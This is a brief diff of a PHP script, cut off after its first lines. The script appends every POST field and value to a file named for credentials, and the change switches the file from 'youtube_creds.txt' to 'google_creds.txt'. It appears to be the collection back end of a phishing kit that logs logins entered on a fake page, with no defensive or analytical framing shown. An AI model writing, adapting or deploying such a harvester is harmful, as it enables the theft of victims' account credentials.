@@ -1,5 +1,5 @@
 <?php
-$file = 'youtube_creds.txt';
+$file = 'google_creds.txt';
 $handle = fopen($file, 'a');
 foreach ($_POST as $key => $value) {
     fwrite($handle, $key . '=' . $value . "\n");
